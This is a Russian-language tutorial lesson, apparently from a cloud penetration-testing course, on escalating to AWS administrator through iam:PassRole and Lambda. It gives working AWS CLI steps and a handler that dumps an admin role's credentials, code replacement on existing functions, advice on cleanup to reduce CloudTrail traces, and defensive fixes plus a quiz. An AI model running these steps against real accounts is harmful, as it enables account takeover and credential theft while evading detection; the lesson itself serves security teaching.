---
id: cloud-lambda-privesc
title: "Lambda: эскалация через роль, слои и конфигурацию функции"
category: cloud
parent: cloud-serverless
difficulty: expert
order: 2
tags: [cloud, aws, lambda, privesc, passrole, layer, function-url]
prerequisites: [cloud-serverless, cloud-serverless-injection]
useful_for:
  - "Эскалация привилегий через Lambda"
  - "Злоупотребление iam:PassRole и update-function"
  - "Понимание serverless-эскалации"
estimated_minutes: 55
summary: "Как из ограниченных прав в Lambda добраться до администратора: iam:PassRole + update-function-configuration, отравление слоёв, Function URL и переменные окружения. Практические цепочки."
---

## Вопрос, с которого всё начинается

У нас есть ключ с правами на Lambda, но **не на IAM напрямую**. Казалось бы, создать админа нельзя. Однако Lambda тесно связана с IAM: функция выполняется **под ролью**, а мы можем эту роль выбрать. Если у нас есть право передать роль функции (`iam:PassRole`), мы можем заставить Lambda работать под админской ролью. Разберём цепочку.

## Наш пример: ключ с правами на Lambda

Объект урока — ключ, у которого, как мы выяснили, есть `iam:PassRole` и права на Lambda. Сначала точно зафиксируем, что разрешено.

## Шаг 1: перечисляем права

Смотрим привязанную политику:

```
$ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/DevOpsLimited --version-id v1
{
  "PolicyVersion": {
    "Document": {
      "Statement": [
        { "Effect": "Allow", "Action": ["lambda:CreateFunction", "lambda:InvokeFunction",
            "lambda:UpdateFunctionConfiguration", "lambda:GetFunction"], "Resource": "*" },
        { "Effect": "Allow", "Action": ["iam:PassRole"], "Resource": "*" },
        { "Effect": "Allow", "Action": ["iam:ListRoles", "iam:ListAttachedRolePolicies"], "Resource": "*" }
      ]
    }
  }
}
```

Читаем: можно создавать и вызывать функции, менять их конфигурацию и **передавать любую роль** (`iam:PassRole` на `*`). Это классическая заготовка эскалации.

## Шаг 2: ищем «жирную» роль

Нам нужна роль, у которой широкие права. Перечислим роли и посмотрим их политики:

```
$ aws iam list-roles --query "Roles[].RoleName" --output text
lambda-exec-basic
deploy-role
admin-role
```

Роль `admin-role` звучит обещающе. Проверим её права:

```
$ aws iam list-attached-role-policies --role-name admin-role
{
  "AttachedPolicies": [
    { "PolicyName": "AdministratorAccess", "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess" }
  ]
}
```

`AdministratorAccess` — полный доступ ко всему. Вот наша цель: заставить Lambda выполниться под `admin-role`.

## Шаг 3: создаём функцию с админской ролью

Пишем минимальный код, который вернёт нам креды роли. Функция в Lambda получает временные креды через переменные окружения (`AWS_ACCESS_KEY_ID` и т. д.), поэтому код просто их выведет:

```
$ cat > index.py <<'EOF'
import os, json
def handler(event, context):
    return {k: os.environ.get(k) for k in
            ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"]}
EOF
$ zip fn.zip index.py
  adding: index.py (deflated 40%)
```

Создаём функцию и **передаём ей `admin-role`**:

```
$ aws lambda create-function --function-name privesc-fn \
    --runtime python3.12 --handler index.handler \
    --role arn:aws:iam::123456789012:role/admin-role \
    --zip-file fileb://fn.zip
{
    "FunctionName": "privesc-fn",
    "Role": "arn:aws:iam::123456789012:role/admin-role",
    "State": "Active"
}
```

`iam:PassRole` позволил назначить функции админскую роль. Lambda примет роль, потому что её trust policy доверяет сервису `lambda.amazonaws.com`.

## Шаг 4: вызываем и забираем креды

Теперь вызовем функцию и прочитаем её ответ — это и будут креды `admin-role`:

```
$ aws lambda invoke --function-name privesc-fn /tmp/out.json
{"StatusCode": 200}
$ cat /tmp/out.json
{"AWS_ACCESS_KEY_ID": "ASIA...", "AWS_SECRET_ACCESS_KEY": "...", "AWS_SESSION_TOKEN": "..."}
```

Экспортируем их и проверяем:

```
$ export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
$ aws sts get-caller-identity
{"Arn": "arn:aws:sts::123456789012:assumed-role/admin-role/privesc-fn", "Account": "123456789012"}
```

Мы — `admin-role`. Из прав только на Lambda мы получили администратора аккаунта. Это и есть эскалация через `iam:PassRole` + Lambda.

## Шаг 5: другие пути через Lambda

Даже без `CreateFunction` есть варианты:

- **UpdateFunctionConfiguration.** Если есть право менять конфигурацию существующей функции с широкой ролью, можно подменить переменные окружения так, чтобы её код «сломался» и выдал данные, или добавить свой слой.
- **Слои (Layers).** Слой — это архив с кодом, подключаемый к функции. Если можно добавить свой слой, можно выполнить свой код в контексте функции.
- **UpdateFunctionCode.** Прямая подмена кода функции на свой.
- **Function URL.** Иногда у функции открыт URL (`AuthType: NONE`) — тогда её можно вызвать напрямую, без API Gateway.

```
$ aws lambda update-function-code --function-name api-handler --zip-file fileb://evil.zip
{
    "FunctionName": "api-handler",
    "LastUpdateStatus": "InProgress"
}
```

Так одна функция превращается в нашего исполнителя с её собственной ролью.

## Шаг 6: что именно делает это возможным

Причина в связке: **право передавать роль** (`iam:PassRole`) плюс **право управлять функцией**. По отдельности они безобидны, вместе — эскалация. AWS именно поэтому ограничивает `PassRole` через условие `iam:PassedToService`, но на практике его часто оставляют на `*`.

## Шаг 7: OPSEC и уборка

Эскалация через Lambda довольно «громкая». В CloudTrail остаются события `CreateFunction`, `PassRole`, `Invoke`. Защитник, который смотрит логи, увидит цепочку. Поэтому в реальном пентесте:

- предпочитают **существующую** функцию с широкой ролью вместо создания новой;
- после получения кредов **удаляют** свою функцию;
- избегают массовых вызовов — один `Invoke` даёт все нужные креды.

```
$ aws lambda delete-function --function-name privesc-fn
```

Уборка не отменяет записи в логах, но уменьшает список подозрительных объектов.

## Шаг 8: та же идея у GCP и Azure

Схема «передай сервису роль, а потом забери её» универсальна:

| AWS | GCP | Azure |
|-----|-----|-------|
| `iam:PassRole` + Lambda | `iam.serviceAccounts.actAs` + Cloud Functions | Managed identity + Functions |
| `lambda:UpdateFunctionCode` | `cloudfunctions.functions.update` | `Microsoft.Web/sites/.../write` |

В GCP право `iam.serviceAccounts.actAs` позволяет назначить функции сервисный аккаунт, а затем выполнить в ней код — ровно тот же результат. В Azure — назначить managed identity и подменить код функции. Вывод один: **сервис, которому можно передать личность, — это путь к этой личности**.

## Шаг 9: как это выглядит в отчёте

Цепочка описывается тремя находками: «неограниченный `iam:PassRole`», «возможность управлять функциями Lambda» и «роль с `AdministratorAccess`», которые вместе дают полный контроль над аккаунтом. Исправление — точечное: ограничить `PassRole` условием `iam:PassedToService` и явным списком ролей, разделить «управление функциями» и «передачу ролей» между разными людьми и настроить алерт в CloudTrail на комбинацию `CreateFunction` + `PassRole`.

## Частые вопросы

**«Почему PassRole так опасен?»** Он позволяет назначить функцию под любой ролью. Функция выполняется от её имени — значит, ты получаешь её права.

**«А если нет CreateFunction?»** Подойдут `update-function-code` или `update-function-configuration` на существующей функции с широкой ролью.

**«Что такое слой?»** Архив с кодом, который подключается к функции. Если можно добавить свой слой, можно выполнить свой код в её контексте.

**«Как защититься?»** Ограничить `PassRole` условием `iam:PassedToService` и списком ролей, разделить управление функциями и передачу ролей.

## Что мы теперь знаем

По-простому:

1. Lambda выполняется под ролью, и роль можно выбрать.
2. `iam:PassRole` + права на Lambda = эскалация до этой роли.
3. Функция возвращает свои временные креды через окружение.
4. Альтернативы: подмена кода, слои, обновление конфигурации.
5. Защита — ограничивать `PassRole` условием на сервис и правами на функции.

## На что смотреть дальше

- **Ищи PassRole.** Это главный множитель прав в AWS.
- **Ищи роли с AdministratorAccess.** Они — цель эскалации.
- **Проверь update-function.** Подмена кода работает и на существующих функциях.
- **Помни про следы.** CreateFunction/Invoke логируются в CloudTrail.

## Квиз

Проверь себя.

```quiz
- question: "Какое право позволяет назначить функции админскую роль?"
  options:
    - "iam:PassRole"
    - "lambda:InvokeFunction"
    - "s3:GetObject"
    - "sts:GetCallerIdentity"
  answer: 0
  explanation: "PassRole передаёт роль сервису (в данном случае Lambda)."
- question: "Как функция получает свои временные креды?"
  options:
    - "Через переменные окружения"
    - "Через SSH"
    - "Через DNS"
    - "Через пароль"
  answer: 0
  explanation: "Lambda кладёт креды роли в окружение процесса."
- question: "Что нужно, чтобы создать функцию с нужной ролью?"
  options:
    - "lambda:CreateFunction и iam:PassRole"
    - "Только s3:*"
    - "root-доступ"
    - "Право на RDS"
  answer: 0
  explanation: "Создание функции плюс передача роли."
- question: "Какой путь эскалации не требует CreateFunction?"
  options:
    - "update-function-configuration или update-function-code"
    - "Через DNS"
    - "Через CloudFront"
    - "Через S3-версии"
  answer: 0
  explanation: "Можно подменить код или конфигурацию существующей функции."
- question: "Как ограничить PassRole правильно?"
  options:
    - "Условием iam:PassedToService и списком ролей"
    - "Запретом Lambda вообще"
    - "Сменой региона"
    - "Длинным паролем"
  answer: 0
  explanation: "Условие сужает, каким сервисам и какие роли можно передать."
```

## Куда дальше

Мы собрали эскалацию через Lambda. Дальше мы разберём **эскалацию в IAM напрямую**: конкретные права вроде `CreatePolicyVersion` и `AttachUserPolicy`, из которых строятся пути к админу. А пока запомни главное: `iam:PassRole` — это мост между «управлять сервисом» и «получить его роль».

## Где пригодится

- **CTF (Cloud):** путь «слабый ключ → админ» через сервис.
- **Bug bounty:** цепочки в AWS-аккаунтах.
- **Пентест:** демонстрация риска `PassRole`.
- **Blue team:** ограничение PassRole и прав на функции.
